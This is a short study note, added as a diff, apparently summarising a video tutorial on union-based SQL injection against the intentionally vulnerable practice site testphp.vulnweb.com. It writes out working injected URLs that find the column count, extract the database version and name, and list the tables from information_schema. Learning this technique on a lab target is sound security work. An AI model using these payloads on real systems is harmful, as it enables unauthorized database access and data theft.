@@ -1,0 +1,59 @@
+Source: https://www.youtube.com/watch?v=WtHnT73NaaQ&t=2979s
+
+Union Based SQLi
+
+Practice webpage: http://testphp.vulnweb.com/
+
+
+at page: http://testphp.vulnweb.com/artists.php?artist=2
+
+we can see an artist information from SQL database and he has an id of 2.
+
+let's try to set id part: artist=2-1
+
+And we receive data from id 1.
+
+if we try:
+http://testphp.vulnweb.com/artists.php?artist=2 AND 1=2
+
+it return us null/empty page (that is what we expect too, because 1 = 2 is False)
+
+let's try UNION in our url and put SELECT 1. When we get error we need to add 1 number every time.
+
+http://testphp.vulnweb.com/listproducts.php?cat=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11
+
+and we receive the injection at 11.
+
+
+At the bottom of the page we can see an other section of data with the values: 2, 7 and 9. 
+That means the webpage fetch data from sql and get these 3 values from database.
+
+if we ask the database version at row 7 like this
+
+http://testphp.vulnweb.com/listproducts.php?cat=1%20UNION%20SELECT%201,2,3,4,5,6,version(),8,9,10,11
+
+we will receive the version information at that position. We can also find the database name by replacing version()
+to database()
+
+But we want only see our data and not the other categories so for that we will add: cat=-999999
+To not receive the other datas and only our injection data.
+
+
+
+When we search how to find the tables names at stack overflow we find this url:
+
+https://stackoverflow.com/questions/3913620/get-all-table-names-of-a-particular-database-by-sql-query
+
+It gives us:
+
+SELECT TABLE_NAME
+FROM INFORMATION_SCHEMA.TABLES
+WHERE TABLE_TYPE = 'BASE TABLE' AND TABLE_CATALOG='dbName'
+
+so we use that:
+
+http://testphp.vulnweb.com/listproducts.php?cat=-999999%20UNION%20SELECT%201,table_name,3,4,5,6,7,8,9,10,11%20FROM%20information_schema.tables%20WHERE%20table_schema%20=%20database()
+
+and we receive all the avaible tables in this database. Then we can start getting datas by using SELECT FROM etc.
+
+
